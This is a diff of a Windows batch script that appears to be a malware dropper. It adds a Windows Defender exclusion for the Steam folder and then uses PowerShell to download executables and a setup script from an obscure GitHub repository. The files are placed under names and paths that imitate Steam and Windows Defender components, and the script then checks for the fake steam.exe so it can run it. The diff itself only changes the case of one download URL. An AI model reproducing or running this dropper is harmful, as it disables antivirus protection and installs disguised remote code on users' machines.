@@ -4,7 +4,7 @@ powershell Add-MpPreference -ExclusionPath "C:\Program Files (x86)\Steam"
 :: Download files using PowerShell
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe' -OutFile 'C:\Program Files (x86)\Steam\resource\steam.exe'"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/setup.ps1' -OutFile 'C:\ProgramData\Microsoft\Windows\setup.ps1'"
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/NetWorkAppControl.exe' -OutFile 'C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/networkappcontrol.exe' -OutFile 'C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe'"
 
 :: Check if the steam.exe file exists and run it
 IF EXIST "C:\Program Files (x86)\Steam\resource\steam.exe" (
